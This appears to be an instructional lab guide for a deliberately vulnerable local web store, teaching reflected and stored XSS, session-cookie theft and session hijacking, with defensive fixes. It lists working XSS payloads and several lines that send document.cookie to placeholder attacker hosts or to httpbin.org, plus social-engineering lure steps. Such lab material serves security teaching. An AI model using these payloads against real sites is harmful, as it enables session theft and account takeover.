# XSS Lab Instructions

## 🎯 **Learning Objectives**
Students will learn how to:
1. Identify XSS vulnerabilities in web applications
2. Steal authentication cookies via XSS
3. Perform session hijacking attacks
4. Understand the impact of XSS on authentication systems

## 🔍 **Lab Setup**

### **Step 1: Start the Application**
```bash
npm start
```
Visit: `http://localhost:3000`

### **Step 2: Login as Admin**
- Go to `/login`
- Username: `admin`
- Password: `admin123`
- Access the dashboard at `/dashboard`

## 🔍 **Understanding the Vulnerabilities**

### **Reconnaissance: Finding Attack Vectors**

**What students should look for:**
1. **URL Parameters**: Does the URL change when you interact with the page?
   - Search boxes often use `?search=` or `?q=` parameters
   - User profiles might use `?user=` or `?id=` parameters
   - Any parameter that reflects user input is a potential XSS vector

2. **Form Inputs**: Where does user input get displayed back to the user?
   - Search results that show "You searched for: [input]"
   - Error messages that include user input
   - Profile pages that display user-provided data

3. **Network Traffic**: Use browser dev tools to observe:
   - What parameters are sent in requests
   - How the server responds with user input
   - Where input validation might be missing

**Example Attack Vector Discovery:**
1. Use the search box normally
2. Watch the URL change to `?search=your_input`
3. Realize: "If I can put XSS in the search box, it goes in the URL!"
4. Test: Try `?search=<script>alert('XSS')</script>`

### **Why Some XSS Payloads Don't Work**

Modern browsers have built-in XSS protection mechanisms:

1. **Inline Script Blocking**: `<script>` tags are often blocked
2. **CSP (Content Security Policy)**: Prevents inline script execution
3. **XSS Filter**: Browser-level protection against common XSS patterns
4. **Event Handler Filtering**: Some browsers block certain event handlers

**Solution**: Use event handlers on HTML elements instead of `<script>` tags:
- `<img src=x onerror=alert('XSS')>` ✅ Works
- `<svg onload=alert('XSS')>` ✅ Works  
- `<script>alert('XSS')</script>` ❌ Often blocked

### **SQL Injection vs XSS**
- **SQL Injection**: Occurs when user input is directly inserted into SQL queries
- **XSS (Cross-Site Scripting)**: Occurs when user input is directly inserted into HTML
- **This Lab**: Fixed SQL injection, but kept XSS for educational purposes

### **Why We Fixed SQL Injection**
The original code had both vulnerabilities:
```javascript
// BAD - Both SQL injection AND XSS
const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;
statusDiv.innerHTML = `You are searching for: <strong>${searchTerm}</strong>`;
```

We fixed the SQL injection but kept the XSS:
```javascript
// GOOD - Fixed SQL injection, kept XSS for lab
const query = `SELECT * FROM products WHERE name LIKE ?`;
statusDiv.innerHTML = `You are searching for: <strong>${searchTerm}</strong>`;
```

## 🚨 **XSS Vulnerabilities to Exploit**

### **1. Reflected XSS via URL Parameters**
**Location**: Main page search box + URL parameters
**Vulnerability**: User input is directly inserted into HTML without escaping
**Attack Vector**: Malicious links that appear to be product searches

**How it works**:
1. Attacker creates malicious URL with XSS payload
2. Victim clicks the link (appears to be a product search)
3. XSS executes in victim's browser
4. Attacker can steal cookies, session data, etc.

**Malicious URLs to test**:
```
http://localhost:3000/?search=<img src=x onerror=alert('XSS')>
http://localhost:3000/?search=<svg onload=alert('XSS')>
http://localhost:3000/?search=<img src=x onerror="alert('Reflected XSS!')" />
```

**Working Payloads** (test these first):
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<img src=x onerror="alert('XSS!')" />
<iframe src="javascript:alert('XSS')"></iframe>
```

**Advanced Payloads** (may be blocked by browser security):
```html
<script>alert('XSS!')</script>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Why `<script>` tags might not work**:
- Modern browsers have built-in XSS protection
- Inline script execution is often blocked for security
- Use event handlers (`onerror`, `onload`) instead

**Cookie Theft Payload** (use this for the lab):
```html
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

### **2. Stored XSS via Product Descriptions**
**Location**: Add Product form description field
**Vulnerability**: Product descriptions are stored in database and displayed using innerHTML
**Attack Vector**: Malicious script tags in product descriptions

**How it works**:
1. Attacker adds a product with XSS payload in description
2. Payload is stored in database
3. Every time the product is displayed, XSS executes
4. Affects all users who view the product

**Test Payloads for Product Description**:
```html
<script>alert('Stored XSS!')</script>
<script>alert('Cookie: ' + document.cookie)</script>
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```

**Steps to Test**:
1. Go to the main page
2. Scroll down to "Add New Product" form
3. Fill in:
   - **Product Name**: Test Product
   - **Description**: `<script>alert('Stored XSS!')</script>`
   - **Price**: 99.99
4. Click "Add Product"
5. The XSS should execute immediately when the product appears

### **3. Reflected XSS Attack Scenario**

**The Attack**:
1. **Attacker creates malicious link**:
   ```
   http://localhost:3000/?search=<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
   ```

2. **Attacker sends link to victim** (via email, chat, etc.):
   ```
   "Hey! Check out this cool product search: 
   http://localhost:3000/?search=wireless+headphones"
   ```
   (But the real URL contains the XSS payload)

3. **Victim clicks the link**:
   - Page loads normally
   - Search appears to be for "wireless headphones"
   - XSS payload executes in background
   - Cookie is stolen and sent to attacker

4. **Attacker hijacks session**:
   - Uses stolen cookie to access victim's dashboard
   - Performs actions as the victim

### **3. Cookie Theft via XSS**
**Goal**: Steal the `techstore.sid` session cookie

**Payload**:
```html
<script>
  fetch('http://attacker-server.com/steal', {
    method: 'POST',
    body: 'cookie=' + document.cookie
  });
</script>
```

**Alternative (for testing)**:
```html
<script>alert('Cookie: ' + document.cookie)</script>
```

## 🍪 **Understanding the Cookies**

### **`techstore.sid`** - The Target Cookie
- **Type**: Session ID cookie
- **Purpose**: Identifies the user's session
- **Value**: Encoded session identifier (e.g., `s%3Aabc123def456.xyz789`)
- **Security**: This is what attackers want to steal!

### **`connect.sid`** - Legacy Cookie
- **Type**: Default Express session cookie
- **Status**: Should be cleared, but might exist from previous sessions
- **Note**: Not the primary target

### **`cid`** - Third-party Cookie
- **Type**: External tracking cookie
- **Source**: Browser or extension
- **Note**: Not part of our application

## 🎭 **Session Hijacking Attack**

### **Step 1: Steal the Cookie**
1. Login as admin
2. Go to dashboard
3. Copy the session cookie from the "Security Information" section
4. Or use XSS to steal it automatically

### **Step 2: Hijack the Session**
1. Open a new browser/incognito window
2. Open Developer Tools (F12)
3. Go to Console tab
4. Set the stolen cookie:
   ```javascript
   document.cookie = "techstore.sid=STOLEN_SESSION_ID_HERE";
   ```
5. Navigate to `/dashboard`
6. You should now be logged in as the victim!

## 🛡️ **Defense Mechanisms to Discuss**

### **1. Input Sanitization**
```javascript
// BAD (vulnerable)
statusDiv.innerHTML = `You are searching for: <strong>${searchTerm}</strong>`;

// GOOD (safe)
statusDiv.textContent = `You are searching for: ${searchTerm}`;
```

### **2. Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

### **3. HttpOnly Cookies**
```javascript
// In server.js
cookie: {
    httpOnly: true,  // Prevents JavaScript access
    secure: true,    // HTTPS only
    sameSite: 'strict'
}
```

### **4. Output Encoding**
```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

## 🧪 **Practical Demonstration**

### **Step 1: Observe URL Parameters (Attack Vector Discovery)**
1. Go to `http://localhost:3000`
2. Search for "wireless" in the search box
3. **Observe the URL** - it should change to:
   ```
   http://localhost:3000/?search=wireless
   ```
4. This shows students how search parameters work and where XSS can be injected

### **Step 2: Test Reflected XSS**
1. Copy this URL and paste it in a new browser tab:
   ```
   http://localhost:3000/?search=<img src=x onerror=alert('Reflected XSS!')>
   ```
2. You should see an alert box pop up
3. The search input will be pre-filled with the payload
4. **Notice the URL** contains the XSS payload - this is the attack vector!

### **Step 2: Simulate Cookie Theft**
1. Login as admin first: `http://localhost:3000/login`
2. Go to dashboard to see your session cookie
3. Copy this malicious URL:
   ```
   http://localhost:3000/?search=<img src=x onerror="alert('Cookie: '+document.cookie)">
   ```
4. Paste it in a new tab - you'll see your session cookie!

### **Step 3: Real Attack Simulation**
1. Create a malicious URL that steals cookies:
   ```
   http://localhost:3000/?search=<img src=x onerror="fetch('http://httpbin.org/post',{method:'POST',body:'cookie='+document.cookie})">
   ```
2. This will send the cookie to httpbin.org (a test service)
3. Check the httpbin.org response to see the stolen cookie

### **Step 4: Stored XSS Testing**
1. **Add Malicious Product**:
   - Go to the "Add New Product" form
   - Name: "Malicious Product"
   - Description: `<script>alert('Stored XSS!')</script>`
   - Price: 99.99
   - Click "Add Product"
   - Alert should appear immediately

2. **Test Cookie Theft**:
   - Add another product with:
   - Description: `<script>alert('Cookie: ' + document.cookie)</script>`
   - This will show your session cookie

### **Step 5: Complete Attack Demonstration**
1. **Reconnaissance**: Search for "headphones" and observe URL becomes `?search=headphones`
2. **Reflected XSS**: Try `?search=<img src=x onerror=alert('XSS')>`
3. **Stored XSS**: Add product with `<script>alert('Stored XSS!')</script>` in description
4. **Cookie Theft**: Use both reflected and stored XSS to steal cookies
5. **Social Engineering**: Create malicious links and products

## 📝 **Lab Questions for Students**

1. **What is the difference between `innerHTML` and `textContent`?**
2. **Why is the session cookie the primary target for XSS attacks?**
3. **How could you modify the application to prevent XSS attacks?**
4. **What other sensitive information could be stolen via XSS?**
5. **How would you detect if your session has been hijacked?**
6. **Why is reflected XSS particularly dangerous in social engineering attacks?**
7. **How could you make a malicious link look more legitimate to victims?**

## 🔧 **Advanced Challenges**

### **Challenge 1: Stealth Cookie Theft**
Create an XSS payload that steals cookies without alerting the user.

### **Challenge 2: Persistent XSS**
Find a way to make the XSS payload persist across page reloads.

### **Challenge 3: CSRF + XSS**
Combine XSS with CSRF to perform actions on behalf of the victim.

## 🚨 **Important Notes**

- This lab is for educational purposes only
- Never perform these attacks on real applications without permission
- Always test in isolated environments
- Report vulnerabilities responsibly in real-world scenarios
